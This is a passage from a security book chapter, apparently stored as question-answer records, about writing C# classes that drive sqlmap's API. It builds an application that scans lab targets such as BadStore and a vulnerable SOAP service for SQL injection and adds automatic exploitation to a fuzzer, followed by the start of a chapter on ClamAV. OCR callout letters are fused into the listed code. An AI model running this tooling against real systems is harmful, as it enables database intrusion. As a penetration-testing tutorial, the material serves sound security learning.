taskID + \"/delete\");\ntoken = JObject.Parse(response);\nbool success = (bool)token.{SelectToken(\"success\");\nConsole.WriteLine(\"Delete successful: \" + success);\n}\n}\nListing 9-14: The Main() method of our sqlmap console application\nThe Json.NET library makes dealing with JSON in C# simple (as you saw\nin Chapter 5). We grab the host and port from the first and second argu-\nments passed into the program u, respectively. Then we use int.Parse() to\nparse the integer from the string argument for the port. Although we’ve been\nusing port 8775 for this whole chapter, since the port is configurable (8775 is\njust the default), we shouldn’t assume it will be 8775 all the time. Once we\nhave assigned values to the variables, we instantiate a new SqlmapSession v\nusing the parameters passed into the program. We then call the /task/new\nendpoint w to retrieve a new task ID and use the JObject class to parse the\nJSON returned. Once we have the response parsed, we use the SelectToken()\nmethod x to retrieve the value for the taskid key and assign this value to\nthe taskID variable.\nnote A few standard types in C# have a Parse() method, like the int.Parse() method we\njust used. The int type is an Int32, so it will attempt to parse a 32-bit integer. Int16\nis a short integer, so short.Parse() will attempt to parse a 16-bit integer. Int64 is a\nlong integer, and long.Parse() will attempt to parse a 64-bit integer. Another useful\nParse() method exists on the DateTime class. Each of these methods is static, so no\nobject instantiation is necessary.\nAfter printing the new taskID to the console y, we can delete the task by\ncalling the /task/taskid/delete endpoint z. We again use the JObject class to\n176 Chapter 9\nparse the JSON response and then retrieve the value for the success key {,\ncast it as a Boolean, and assign it to the success variable. This variable is\nprinted to the console, showing the user whether the task was successfully\ndeleted. When you run the tool, it produces output about creating and\ndeleting a task, as shown in Listing 9-15.\n$ mono ./ch9_automating_sqlmap.exe 127.0.0.1 8775\nNew task id: 96d9fb9d277aa082\nDeleting task: 96d9fb9d277aa082\nDelete successful: True\nListing 9-15: Running the program that creates a sqlmap task and then deletes it\nOnce we know we can successfully create and delete a task, we can create\nthe SqlmapManager class to encapsulate the API functionality we want to use\nin the future, such as setting scan options and getting the scan results.\nthe SqlmapManager Class\nThe SqlmapManager class, shown in Listing 9-16, wraps the methods exposed\nthrough the API in an easy-to-use (and maintainable!) way. When we finish\nwriting the methods needed for this chapter, we can start a scan on a given\nURL, watch it until it completes, and then retrieve the results and delete\nthe task. We’ll also make heavy use of the Json.NET library. To reiterate, the\ngoal of the session/manager pattern is to separate the transport of the API\nfrom the functionality exposed by the API. An added benefit to this pattern\nis that it allows the programmer using the library to focus on the results\nAPI calls. The programmer can, however, still interact directly with the ses-\nsion if needed.\npublic class uSqlmapManager : IDisposable\n{\nprivate vSqlmapSession _session = null;\npublic wSqlmapManager(SqlmapSession session)\n{\nif (session == null)\nthrow new ArgumentNullException(\"session\");\n_session = session;\n}\npublic void xDispose()\n{\n_session.Dispose();\n_session = null;\n}\n}\nListing 9-16: The SqlmapManager class\nAutomating sqlmap 177\nWe declare the SqlmapManager class u and have it implement the\nIDisposable interface. We also declare a private field v for the SqlmapSession\nthat will be used throughout the class. Then, we create the SqlmapManager\nconstructor w, which accepts a SqlmapSession, and we assign the session to\nthe private _session field.\nFinally, we implement the Dispose() method x, which cleans up the\nprivate SqlmapSession. You may wonder why we have both the SqlmapSession\nand SqlmapManager implement IDisposable, when in the Dispose() method of\nthe SqlmapManager, we call Dispose() on the SqlmapSession as well. A program-\nmer may want to instantiate only a SqlmapSession and interact with it directly\nin case a new API endpoint is introduced that the manager hasn’t been\nupdated to support. Having both classes implement IDisposable offers the\ngreatest flexibility.\nSince we just implemented the methods needed to create a new task and\ndelete an existing one when we tested the SqlmapSession class in Listing 9-14,\nwe’ll add these actions as their own methods to the SqlmapManager class above\nthe Dispose() method, as shown in Listing 9-17.\npublic string NewTask()\n{\nJToken tok = JObject.Parse(_session.ExecuteGet(\"/task/new\"));\nureturn tok.SelectToken(\"taskid\").ToString();\n}\npublic bool DeleteTask(string taskid)\n{\nJToken tok = Jobject.Parse(session.ExecuteGet(\"/task/\" + taskid + \"/delete\"));\nvreturn (bool)tok.SelectToken(\"success\");\n}\nListing 9-17: The NewTask() and DeleteTask() methods to manage a task in sqlmap\nThe NewTask() and DeleteTask() methods make it easy to create and\ndelete tasks as we need in the SqlmapManager class and are nearly identical to\nthe code in Listing 9-14, except that they print less output and return the\ntask ID after creating a new task u or the result (success or failure) of delet-\ning a task v.\nNow we can use these new methods to rewrite the previous command\nline application testing the SqlmapSession class, as seen in Listing 9-18.\npublic static void Main(string[] args)\n{\nstring host = args[0];\nint port = int.Parse(args[1]);\nusing (SqlmapManager mgr = new SqlmapManager(new SqlmapSession(host, port)))\n{\nstring taskID = mgr.uNewTask();\nConsole.WriteLine(\"Created task: \" + taskID);\nConsole.WriteLine(\"Deleting task\");\n178 Chapter 9\nbool success = mgr.vDeleteTask(taskID);\nConsole.WriteLine(\"Delete successful: \" + success);\n} //clean up and dispose manager automatically\n}\nListing 9-18: Rewriting the application to use the SqlmapManager class\nThis code is more intuitive to read and easier to understand at a quick\nglance than the original application in Listing 9-14. We’ve replaced the\ncode to create and delete tasks with the NewTask() u and DeleteTask() v\nmethods. By just reading the code, you have no idea that the API uses\nHTTP as its transport or that we are dealing with JSON responses.\nListing sqlmap Options\nThe next method we’ll implement (shown in Listing 9-19) retrieves the cur-\nrent options for tasks. One thing to note is that because sqlmap is written in\nPython, it’s weakly typed. This means that a few of the responses will have a\nmixture of types that are a bit difficult to deal with in C#, which is strongly\ntyped. JSON requires all keys to be strings, but the values in the JSON will\nhave different types, such as integers, floats, Booleans, and strings. What\nthis means for us is that we must treat all the values as generically as pos-\nsible on the C# side of things. To do that, we’ll treat them as simple objects\nuntil we need to know their types.\npublic Dictionary<string, object> uGetOptions(string taskid)\n{\nDictionary<string, object> options = vnew Dictionary<string, object>();\nJObject tok = JObject.wParse(_session.ExecuteGet (\"/option/\" + taskid + \"/list\"));\ntok = tok[\"options\"] as JObject;\nxforeach (var pair in tok)\noptions.Add(pair.Key, ypair.Value);\nreturn zoptions;\n}\nListing 9-19: The GetOptions() method\nThe GetOptions() method u in Listing 9-19 accepts a single argument:\nthe task ID to retrieve the options for. This method will use the same API\nendpoint we used in Listing 9-5 when testing the sqlmap API with curl. We\nbegin the method by instantiating a new Dictionary v that requires the key\nto be a string but allows you to store any kind of object as the other value of\nthe pair. After making the API call to the options endpoint and parsing the\nresponse w, we loop x through the key/value pairs in the JSON response\nfrom the API and add them to the options dictionary y. Finally, the cur-\nrently set options for the task are returned z so that we can update them\nand use them later when we start the scan.\nAutomating sqlmap 179\nWe’ll use this dictionary of options in the StartTask() method, which\nwe’ll implement soon, to pass options as an argument to start a task with.\nFirst, though, go ahead and add the following lines in Listing 9-20 to your\nconsole application after calling mgr.NewTask() but before deleting the task\nwith mgr.DeleteTask().\nDictionary<string, object> uoptions = mgr.GetOptions(vtaskID);\nw foreach (var pair in options)\nConsole.WriteLine(\"Key: \" + pair.Key + \"\\t:: Value: \" + pair.Value);\nListing 9-20: Lines appended to the main application to retrieve and print the current\ntask options\nIn this code, a taskID is given to GetOptions() v as an argument, and\nthe returned options dictionary is assigned to a new Dictionary, which is also\ncalled options u. The code then loops through options and prints each of its\nkey/value pairs w. After adding these lines, rerun your application in your\nIDE or in the console, and you should see the full list of options you can set\nwith their current values printed to the console. This is shown in Listing 9-21.\n$ mono ./ch9_automating_sqlmap.exe 127.0.0.1 8775\nKey: crawlDepth ::Value:\nKey: osShell ::Value: False\nKey: getUsers ::Value: False\nKey: getPasswordHashes ::Value: False\nKey: excludeSysDbs ::Value: False\nKey: uChar ::Value:\nKey: regData ::Value:\nKey: prefix ::Value:\nKey: code ::Value:\n--snip--\nListing 9-21: Printing the task options to the screen after retrieving them with GetOptions()\nNow that we’re able to see task options, it’s time to perform a scan.\nMaking a Method to Perform Scans\nNow we’re ready to prepare our task to perform a scan. Within our options\ndictionary, we have a key that’s a url, which is the URL we’ll test for SQL\ninjections. We pass the modified Dictionary to a new StartTask() method,\nwhich posts the dictionary as a JSON object to the endpoint and uses the\nnew options when the task begins.\nUsing the Json.NET library makes the StartTask() method super short\nbecause it takes care of all the serialization and deserialization for us, as\nListing 9-22 shows.\npublic bool StartTask(string taskID, Dictionary<string, object> opts)\n{\nstring json = JsonConvert.uSerializeObject(opts);\nJToken tok = JObject.vParse(session.ExecutePost(\"/scan/\"+taskID+\"/start\", json));\n180 Chapter 9\nwreturn(bool)tok.SelectToken(\"success\");\n}\nListing 9-22: The StartTask() method\nWe use the Json.NET JsonConvert class to convert a whole object into\nJSON. The SerializeObject() method u is used to get a JSON string repre-\nsenting the options dictionary that we can post to the endpoint. Then we\nmake the API request and parse the JSON response v. Finally, we return w\nthe value of the success key from the JSON response, which is hopefully\ntrue. This JSON key should always be present in the response for this API\ncall, and it will be true when the task was started successfully or false if the\ntask was not started.\nIt would also be useful to know when a task is complete. This way, you\nknow when you can get the full log of the task and when to delete the task.\nTo get the task’s status, we implement a small class (shown in Listing 9-23)\nthat represents a sqlmap status response from the /scan/taskid/status API\nendpoint. This can be added in a new class file if you like, even though it’s\na super-short class.\npublic class SqlmapStatus\n{\nupublic string Status { get; set; }\nvpublic int ReturnCode { get; set; }\n}\nListing 9-23: The SqlmapStatus class\nFor the SqlmapStatus class, we don’t need to define a constructor because,\nby default, every class has a public constructor. We do define two public\nproperties on the class: a string status message u and the integer return\ncode v. To get the task status and store it in SqlmapStatus, we implement\nGetScanStatus, which takes a taskid as input and returns a SqlmapStatus object.\nThe GetScanStatus() method is shown in Listing 9-24.\npublic SqlmapStatus GetScanStatus(string taskid)\n{\nJObject tok = JObject.Parse(_session.uExecuteGet(\"/scan/\" + taskid + \"/status\"));\nSqlmapStatus stat = vnew SqlmapStatus();\nstat.Status = (string)tok[\"status\"];\nif (tok[\"returncode\"].Type != JTokenType.Nullw)\nstat.ReturnCode = (int)tok[\"returncode\"];\nxreturn stat;\n}\nListing 9-24: The GetScanStatus() method\nWe use the ExecuteGet() method we defined earlier to retrieve the /scan/\ntaskid/status API endpoint u, which returns a JSON object with information\nabout the task’s scan status. After calling the API endpoint, we create a new\nAutomating sqlmap 181\nSqlmapStatus object v and assign the status value from the API call to the\nStatus property. If the returncode JSON value isn’t null w, we cast it to an\ninteger and assign the result to the ReturnCode property. Finally, we return x\nthe SqlmapStatus object to the caller.\nThe New Main() Method\nNow we’ll add the logic to the command line application so that we can scan\nthe vulnerable Search page within BadStore that we exploited in Chapter 2\nand monitor the scan. Begin by adding the code shown in Listing 9-25 to\nthe Main() method before you call DeleteTask.\noptions[\"url\"] = u\"http://192.168.1.75/cgi-bin/badstore.cgi?\" +\n\"searchquery=fdsa&action=search\";\nvmgr.StartTask(taskID, options);\nwSqlmapStatus status = mgr.GetScanStatus(taskID);\nxwhile (status.Status != \"terminated\")\n{\nSystem.Threading.Thread.Sleep(new TimeSpan(0,0,10));\nstatus = mgr.GetScanStatus(taskID);\n}\ny Console.WriteLine(\"Scan finished!\");\nListing 9-25: Starting a scan and watching it finish in the main sqlmap application\nReplace the IP address u with that of the BadStore you wish to scan.\nAfter the application assigns the url key in the options dictionary, it will\nstart the task with the new options v and get the scan status w, which\nshould be running. Then, the application will loop x until the status of the\nscan is terminated, which means the scan has finished. The application will\nprint \"Scan finished!\" y once it exits the loop.\nreporting on a Scan\nTo see if sqlmap was able to exploit any of the vulnerable parameters, we’ll\ncreate a SqlmapLogItem class to retrieve the scan log, as shown in Listing 9-26.\npublic class SqlmapLogItem\n{\npublic string Message { get; set; }\npublic string Level { get; set; }\npublic string Time { get; set; }\n}\nListing 9-26: The SqlmapLogItem class\nThis class has only three properties: Message, Level, and Time. The Message\nproperty contains the message describing the log item. Level controls how\n182 Chapter 9\nmuch information sqlmap will print in the report, which will be Error, Warn,\nor Info. Each log item has only one of these levels, which makes it easy to\nsearch for specific types of log items later (say, when you just want to print\nthe errors but not the warnings or informational items). Errors are gener-\nally fatal, while warnings mean something seems wrong but sqlmap can\nkeep going. Informational items are just that: basic information about what\nthe scan is doing or finding, such as the type of injection being tested for.\nFinally, Time is the time the item was logged.\nNext, we implement the GetLog() method to return a list of these\nSqlmapLogItems and then retrieve the log by executing a GET request on\nthe /scan/taskid/log endpoint, as shown in Listing 9-27.\npublic List<SqlmapLogItem> GetLog(string taskid)\n{\nJObject tok = JObject.Parse(session.uExecuteGet(\"/scan/\" + taskid + \"/log\"));\nJArray items = tok [\"log\"]v as JArray;\nList<SqlmapLogItem> logItems = new List<SqlmapLogItem>();\nwforeach (var item in items)\n{\nxSqlmapLogItem i = new SqlmapLogItem();\ni.Message = (string)item[\"message\"];\ni.Level = (string)item[\"level\"];\ni.Time = (string)item[\"time\"];\nlogItems.Add(i);\n}\nyreturn logItems;\n}\nListing 9-27: The GetLog() method\nThe first thing we do in the GetLog() method is make the request to the\nendpoint u and parse the request into a JObject. The log key v has an array\nof items as its value, so we pull its value as a JArray using the as operator and\nassign it to the items variable w. This may be the first time you have seen\nthe as operator. My main reason for using it is readability, but the primary\ndifference between the as operator and explicit casting is that as will return\nnull if the object to the left cannot be cast to the type on the right. You\ncan’t use it on value types because value types can’t be null.\nOnce we have an array of log items, we create a list of SqlmapLogItems. We\nloop over each item in the array and instantiate a new SqlmapLogItem each\ntime x. Then we assign the new object the value in the log item returned by\nsqlmap. Finally, we add the log item to the list and return the list to the caller\nmethod y.\nautomating a Full sqlmap Scan\nWe’ll call GetLog() from the console application after the scan terminates\nand print the log messages to the screen. Your application’s logic should\nlook like Listing 9-28 now.\nAutomating sqlmap 183\npublic static void Main(string[] args)\n{\nusing (SqlmapSession session = new SqlmapSession(\"127.0.0.1\", 8775))\n{\nusing (SqlmapManager manager = new SqlmapManager(session))\n{\nstring taskid = manager.NewTask();\nDictionary<string, object> options = manager.GetOptions(taskid);\noptions[\"url\"] = args[0];\noptions[\"flushSession\"] = true;\nmanager.StartTask(taskid, options);\nSqlmapStatus status = manager.GetScanStatus(taskid);\nwhile (status.Status != \"terminated\")\n{\nSystem.Threading.Thread.Sleep(new TimeSpan(0,0,10));\nstatus = manager.GetScanStatus(taskid);\n}\nList<SqlmapLogItem> logItems = manager.uGetLog(taskid);\nforeach (SqlmapLogItem item in logItems)\nvConsole.WriteLine(item.Message);\nmanager.DeleteTask(taskid);\n}\n}\n}\nListing 9-28: The full Main() method to automate sqlmap to scan a URL\nAfter adding the call to GetLog() u to the end of the sqlmap main appli-\ncation, we can iterate over the log messages and print them to the screen v\nfor us to see when the scan is finished. Finally, we are ready to run the full\nsqlmap scan and retrieve the results. Passing the BadStore URL as an argu-\nment to the application will send the scan request to sqlmap. The results\nshould look something like Listing 9-29.\n$ ./ch9_automating_sqlmap.exe \"http://10.37.129.3/cgi-bin/badstore.cgi?\nsearchquery=fdsa&action=search\"\nflushing session file\ntesting connection to the target URL\nheuristics detected web page charset 'windows-1252'\nchecking if the target is protected by some kind of WAF/IPS/IDS\ntesting if the target URL is stable\ntarget URL is stable\ntesting if GET parameter 'searchquery' is dynamic\nconfirming that GET parameter 'searchquery' is dynamic\nGET parameter 'searchquery' is dynamic\nheuristics detected web page charset 'ascii'\nheuristic (basic) test shows that GET parameter 'searchquery' might be\ninjectable\n184 Chapter 9\n(possible DBMS: 'MySQL')\n–-snip--\nGET parameter 'searchqueryu' seems to be 'MySQL <= 5.0.11 OR time-based blind\n(heavy query)' injectable\ntesting 'Generic UNION query (NULL) - 1 to 20 columns'\nautomatically extending ranges for UNION query injection technique tests as\nthere is at least one other (potential) technique found\nORDER BY technique seems to be usable. This should reduce the time needed to\nfind the right number of query columns. Automatically extending the range for\ncurrent UNION query injection technique test\ntarget URL appears to have 4 columns in query\nGET parameter 'searchqueryv' is 'Generic UNION query (NULL) - 1 to 20\ncolumns' injectable\nthe back-end DBMS is MySQLw\nListing 9-29: Running the sqlmap application on a vulnerable BadStore URL\nIt works! The output from sqlmap can be very verbose and potentially\nconfusing for someone not used to reading it. But even though it can be a\nlot to take in, there are key points to look for. As you can see in the output,\nsqlmap finds that the searchquery parameter is vulnerable to a time-based\nSQL injection u, that there is a UNION-based SQL injection v, and that the\ndatabase is MySQL w. The rest of the messages are information regarding\nwhat sqlmap is doing during the scan. With these results, we can definitely\nsay this URL is vulnerable to at least two SQL injection techniques.\nintegrating sqlmap with the SOaP Fuzzer\nWe have now seen how to use the sqlmap API to audit and exploit a simple\nURL. In Chapters 2 and 3, we wrote a few fuzzers for vulnerable GET and\nPOST requests in SOAP endpoints and JSON requests. We can use the\ninformation we gather from our fuzzers to drive sqlmap and, with only a\nfew more lines of code, go from finding potential vulnerabilities to fully\nvalidating and exploiting them.\nAdding sqlmap GET Request Support to the SOAP Fuzzer\nOnly two types of HTTP requests are made in the SOAP fuzzer: GET\nand POST requests. First, we add support to our fuzzer so it will send\nURLs with GET parameters to sqlmap. We also want the ability to tell\nsqlmap which parameter we think is vulnerable. We add the methods\nTestGetRequestWithSqlmap() and TestPostRequestWithSqlmap() to the bottom\nof the SOAP fuzzer console application to test GET and POST requests,\nrespectively. We’ll also update the FuzzHttpGetPort(), FuzzSoapPort(), and\nFuzzHttpPostPort() methods in a later section to use the two new methods.\nLet’s start by writing the TestGetRequestWithSqlmap() method, shown in\nListing 9-30.\nstatic void TestGetRequestWithSqlmap(string url, string parameter)\n{\nConsole.WriteLine(\"Testing url with sqlmap: \" + url);\nAutomating sqlmap 185\nuusing (SqlmapSession session = new SqlmapSession(\"127.0.0.1\", 8775))\n{\nusing (SqlmapManager manager = new SqlmapManager(session))\n{\nvstring taskID = manager.NewTask();\nwvar options = manager.GetOptions(taskID);\noptions[\"url\"] = url;\noptions[\"level\"] = 1;\noptions[\"risk\"] = 1;\noptions[\"dbms\"] = x\"postgresql\";\noptions[\"testParameter\"] = yparameter;\noptions[\"flushSession\"] = true;\nmanager.zStartTask(taskID, options);\nListing 9-30: First half of the TestGetRequestWithSqlmap() method\nThe first half of the method creates our SqlmapSession u and SqlmapManager\nobjects, which we call session and manager, respectively. Then it creates a new\ntask v and retrieves and sets up the sqlmap options for our scan w. We\nexplicitly set the DBMS to PostgreSQL x since we know the SOAP service\nuses PostgreSQL. This saves us some time and bandwidth by testing only\nPostgreSQL payloads. We also set the testParameter option to the parameter\nwe decided is vulnerable y after previously testing it with a single apostrophe\nand receiving an error from the server. We then pass the task ID and the\noptions to the StartTask() method z of manager to begin the scan.\nListing 9-31 details the second half of the TestGetRequestWithSqlmap()\nmethod, similar to the code we wrote in Listing 9-25.\nSqlmapStatus status = manager.GetScanStatus(taskid);\nwhile (status.Status != u\"terminated\")\n{\nSystem.Threading.Thread.Sleep(new TimeSpan(0,0,10));\nstatus = manager.GetScanStatus(taskID);\n}\nList<SqlmapLogItem> logItems = manager.vGetLog(taskID);\nforeach (SqlmapLogItem item in logItems)\nConsole.wWriteLine(item.Message);\nmanager.xDeleteTask(taskID);\n}\n}\n}\nListing 9-31: The second half of the TestGetRequestWithSqlmap() method\nThe second half of the method watches the scan until it is finished,\njust like in our original test application. Since we have written similar code\nbefore, I won’t go over every line. After waiting until the scan is finished run-\nning u, we retrieve the scan results using GetLog() v. We then write the scan\n186 Chapter 9\nresults to the screen w for the user to see. Finally, the task is deleted when\nthe task ID is passed to the DeleteTask() method x.\nAdding sqlmap POST Request Support\nThe TestPostRequestWithSqlmap() method is a bit more complex than its com-\npanion. Listing 9-32 shows the beginning lines of the method.\nstatic void TestPostRequestWithSqlmap(ustring url, string data,\nstring soapAction, string vulnValue)\n{\nvConsole.WriteLine(\"Testing url with sqlmap: \" + url);\nwusing (SqlmapSession session = new SqlmapSession(\"127.0.0.1\", 8775))\n{\nusing (SqlmapManager manager = new SqlmapManager(session))\n{\nxstring taskID = manager.NewTask();\nvar options = manager.GetOptions(taskID);\noptions[\"url\"] = url;\noptions[\"level\"] = 1;\noptions[\"risk\"] = 1;\noptions[\"dbms\"] = \"postgresql\";\noptions[\"data\"] = data.yReplace(vulnValue, \"*\").Trim();\noptions[\"flushSession\"] = \"true\";\nListing 9-32: Beginning lines of the TestPostRequestWithSqlmap() method\nThe TestPostRequestWithSqlmap() method accepts four arguments u. The\nfirst argument is the URL that will be sent to sqlmap. The second argu-\nment is the data that will be in the post body of the HTTP request—be it\nPOST parameters or SOAP XML. The third argument is the value that will\nbe passed in the SOAPAction header in the HTTP request. The last argument\nis the unique value that is vulnerable. It will be replaced with an asterisk in\nthe data from the second argument before being sent to sqlmap to fuzz.\nAfter we print a message to the screen to tell the user which URL is\nbeing tested v, we create our SqlmapSession and SqlmapManager objects w.\nThen, as before, we create a new task and set the current options x. Pay\nspecial attention to the data option y. This is where we replace the vul-\nnerable value in the post data with an asterisk. The asterisk is a special nota-\ntion in sqlmap that says, “Ignore any kind of smart parsing of the data and\njust search for a SQL injection in this specific spot.”\nWe still need to set one more option before we can start the task. We\nneed to set the correct content type and SOAP action in the HTTP headers\nin the request. Otherwise, the server will just return 500 errors. This is what\nthe next part of the method does, as detailed in Listing 9-33.\nstring headers = string.Empty;\nif (!string.uIsNullOrWhitespace(soapAction))\nheaders = \"Content-Type: text/xml\\nSOAPAction: \" + vsoapAction;\nelse\nheaders = \"Content-Type: application/x-www-form-urlencoded\";\nAutomating sqlmap 187\noptions[\"headers\"] = wheaders;\nmanager.StartTask(taskID, options);\nListing 9-33: Setting the right headers in the TestPostRequestWithSqlmap() method\nIf the soapAction variable v (the value we want in the SOAPAction header\ntelling the SOAP server the action we want to perform) is null or an empty\nstring u, we can assume this is not an XML request but rather a POST\nparameter request. The latter only requires the correct Content-Type to be\nset to x-www-form-urlencoded. If soapAction is not an empty string, however,\nwe should assume we are dealing with an XML request and then set the\nContent-Type to text/xml and add a SOAPAction header with the soapAction vari-\nable as the value. After setting the correct headers in the scan options w, we\nfinally pass the task ID and the options to the StartTask() method.\nThe rest of the method, shown in Listing 9-34, should look famil-\niar. It just watches the scan and returns the results, much as does the\nTestGetRequestWithSqlmap() method.\nSqlmapStatus status = manager.uGetScanStatus(taskID);\nwhile (status.Status != \"terminated\")\n{\nSystem.Threading.Thread.vSleep(new TimeSpan(0,0,10));\nstatus = manager.GetScanStatus(taskID);\n}\nList<SqlmapLogItem> logItems = manager.wGetLog(taskID);\nforeach (SqlmapLogItem item in logItems)\nConsole.xWriteLine(item.Message);\nmanager.yDeleteTask(taskID);\n}\n}\n}\nListing 9-34: The final lines in the TestPostRequestWithSqlmap() method\nThis is exactly like the code in Listing 9-25. We use the GetScanStatus()\nmethod u to retrieve the current status of the task, and while the status\nisn’t terminated, we sleep for 10 seconds v. Then we get the status again.\nOnce finished, we pull the log items w and iterate over each item, printing\nthe log message x. Finally, we delete the task y when all is done.\nCalling the New Methods\nIn order to complete our utility, we need to call these new methods from\ntheir respective fuzzing methods in the SOAP fuzzer. First, we update the\nFuzzSoapPort() method that we made in Chapter 3 by adding the method call\nfor TestPostRequestWithSqlmap() into the if statement that tests whether a syn-\ntax error has occurred due to our fuzzing, as shown in Listing 9-35.\n188 Chapter 9\nif (uresp.Contains(\"syntax error\"))\n{\nConsole.vWriteLine(\"Possible SQL injection vector in parameter: \" +\ntype.Parameters[k].Name);\nwTestPostRequestWithSqlmap(_endpoint, soapDoc.ToString(),\nop.SoapAction, parm.ToString());\n}\nListing 9-35: Adding support to use sqlmap to the FuzzSoapPort() method in the SOAP\nfuzzer from Chapter 3\nIn our original SOAP fuzzer in the FuzzSoapPort() method at the very\nbottom, we tested whether the response came back with an error message\nreporting a syntax error u. If so, we printed the injection vector v for the\nuser. To make the FuzzSoapPort() method use our new method for testing\na POST request with sqlmap, we just need to add a single line after the\noriginal WriteLine() method call printing the vulnerable parameter. Add\na line that calls the TestPostRequestWithSqlmap() method w, and your fuzzer\nwill automatically submit potentially vulnerable requests to sqlmap for\nprocessing.\nSimilarly, we update the FuzzHttpGetPort() method in the if statement\ntesting for a syntax error in the HTTP response, as shown in Listing 9-36.\nif (resp.Contains(\"syntax error\"))\n{\nConsole.WriteLine(\"Possible SQL injection vector in parameter: \" +\ninput.Parts[k].Name);\nTestGetRequestWithSqlmap(url, input.Parts[k].Name);\n}\nListing 9-36: Adding sqlmap support to the FuzzHttpGetPort() method from the\nSOAP fuzzer\nFinally, we update the if statement testing for the syntax error in\nFuzzHttpPostPort() just as simply, as Listing 9-37 shows.\nif (resp.Contains(\"syntax error\"))\n{\nConsole.WriteLine(\"Possible SQL injection vector in parameter: \" +\ninput.Parts[k].Name);\nTestPostRequestWithSqlmap(url, testParams, null, guid.ToString());\n}\nListing 9-37: Adding sqlmap support to the FuzzHttpPostPort() method from the\nSOAP fuzzer\nWith these lines added to the SOAP fuzzer, it should now not only out-\nput potentially vulnerable parameters but also any of the SQL injection\ntechniques sqlmap was able to use to exploit the vulnerabilities.\nRunning the updated SOAP fuzzer tool in your IDE or in a terminal\nshould yield new information printed to the screen regarding sqlmap, as\nListing 9-38 shows.\nAutomating sqlmap 189\n$ mono ./ch9_automating_sqlmap_soap.exe http://172.18.20.40/Vulnerable.asmx\nFetching the WSDL for service: http://172.18.20.40/Vulnerable.asmx\nFetched and loaded the web service description.\nFuzzing service: VulnerableService\nFuzzing soap port: VulnerableServiceSoap\nFuzzing operation: AddUser\nPossible SQL injection vector in parameter: username\nu Testing url with sqlmap: http://172.18.20.40/Vulnerable.asmx\n–-snip--\nListing 9-38: Running the updated SOAP fuzzer with sqlmap support against the\nvulnerable SOAP service from Chapter 3\nIn the SOAP fuzzer output, note the new lines regarding testing the\nURL with sqlmap u. Once sqlmap has finished testing the SOAP request,\nthe sqlmap log should be printed to the screen for the user to see the results.\nConclusion\nIn this chapter, you saw how to wrap the functionality of the sqlmap API\ninto easy-to-use C# classes to create a small application that starts basic\nsqlmap scans against URLs passed as an argument. After we created the\nbasic sqlmap application, we added sqlmap support to the SOAP fuzzer\nfrom Chapter 3 to make a tool that automatically exploits and reports on\npotentially vulnerable HTTP requests.\nThe sqlmap API can use any argument that the command line–based\nsqlmap tool can, making it just as powerful, if not more so. With sqlmap,\nyou can use your C# skills to automatically retrieve password hashes and\ndatabase users after verifying that a given URL or HTTP request is indeed\nvulnerable. We’ve only scratched the surface of sqlmap’s power for offensive\npentesters or security-minded developers looking for more exposure to the\ntools hackers use. Hopefully, you can take the time to learn the more subtle\nnuances of the sqlmap features to really bring flexible security practices to\nyour work.\n190 Chapter 9",
    "question": "What is the process for automating a full sqlmap scan using C# classes to interact with the sqlmap API endpoints?",
    "summary": "The text explains how to use the sqlmap API to create, run, and delete SQL injection tasks. It details the process of using curl to test the API and shows how to implement C# classes like SqlmapSession and SqlmapManager to automate the sqlmap scanning process. The text also demonstrates how to integrate the sqlmap API with a SOAP fuzzer to automatically exploit and report on potentially vulnerable HTTP requests."
  },
  {
    "start": 134,
    "end": 147,
    "text": "10\nau toMa tinG Cl aMaV\nClamAV is an open source antivirus solu-\ntion that is used primarily for scanning\nemails and attachments on email servers\nto identify potential viruses before they reach\nand infect computers on the network. But that cer-\ntainly isn’t its only use case. In this chapter, we’ll use\nClamAV to create an automated virus scanner that\nwe can use to scan files for malware and to identify\nviruses with the help of ClamAV’s database.\nYou’ll learn to automate ClamAV in a couple of ways. One is to inter-\nface with libclamav, the native library that drives ClamAV’s command line\nutilities such as clamscan, a file scanner you may be familiar with. The sec-\nond way is to interface with the clamd daemon through sockets in order to\nperform scans on computers without ClamAV installed.\ninstalling ClamaV\nClamAV is written in C, which creates some complications when automating\nwith C#. It’s available for Linux through common package managers such\nas yum and apt, as well as for Windows and OS X. Many modern Unix distri-\nbutions include a ClamAV package, but that version might not be compat-\nible with Mono and .NET.\nInstalling ClamAV on a Linux system should go something like this:\n$ sudo apt-get install clamav\nIf you’re running a Red Hat or Fedora-based Linux flavor that ships\nwith yum, run something like this:\n$ sudo yum install clamav clamav-scanner clamav-update\nIf you need to enable an extra repository in order to install ClamAV via\nyum, enter the following:\n$ sudo yum install -y epel-release\nThese commands install a version of ClamAV to match your system’s\narchitecture.\nnote Mono and .NET can’t interface with native, unmanaged libraries unless the archi-\ntecture of both are compatible. For example, 32-bit Mono and .NET won’t run the\nsame way with ClamAV compiled for a 64-bit Linux or Windows machine. You will\nneed to install or compile native ClamAV libraries to match the Mono or .NET 32-bit\narchitecture.\nThe default ClamAV package from the package manager might not\nhave the correct architecture for Mono/.NET. If it doesn’t, you’ll need to\nspecifically install ClamAV to match the Mono/.NET architecture. You can\nwrite a program to verify your Mono/.NET version by checking the value of\nIntPtr.Size. An output of 4 indicates a 32-bit version, whereas an output of 8\nis a 64-bit version. If you are running Mono or Xamarin on Linux, OS X, or\nWindows, you can easily check this, as shown in Listing 10-1.\n$ echo \"IntPtr.Size\" | csharp\n4\nListing 10-1: A one-liner to check the architecture of Mono/.NET\nMono and Xamarin ship with an interactive interpreter for C# (called\ncsharp), similar to the python interpreter, or irb for Ruby. By echoing the\nIntPtr.Size string into the interpreter using stdin, you can print the value of\nthe Size property, which in this case is 4 and indicates a 32-bit architecture.\nIf your output is also 4, you would need to install 32-bit ClamAV. It might\nbe easiest to set up a VM with the architecture you expect. Because the\n192 Chapter 10\ninstructions to compile ClamAV differ across Linux, OS X, and Windows,\ninstalling 32-bit ClamAV is outside the scope of this book if you need to do\nit. However, there are many online tutorials that can walk you through the\nsteps for your particular operating system.\nYou can also use the Unix file utility to check whether your ClamAV\nlibrary is a 32- or 64-bit version, as shown in Listing 10-2.\n$ file /usr/lib/x86_64-linux-gnu/libclamav.so.7.1.1\nlibclamav.so.7.1.1: ELF u64-bit LSB shared object, x86-64, version 1 (GNU/Linux),\ndynamically linked, not stripped\nListing 10-2: Using file to view the libclamav architecture\nUsing file, we can see whether the libclamav library has been compiled\nfor a 32-bit or 64-bit architecture. On my computer, Listing 10-2 shows that\nthe library is a 64-bit version u. But in Listing 10-1, IntPtr.Size returned 4,\nnot 8! This means my libclamav (64-bit) and Mono (32-bit) architectures\nare mismatched. I must either recompile ClamAV to be 32-bit in order to\nuse it with my Mono installation or install a 64-bit Mono runtime.\nthe ClamaV 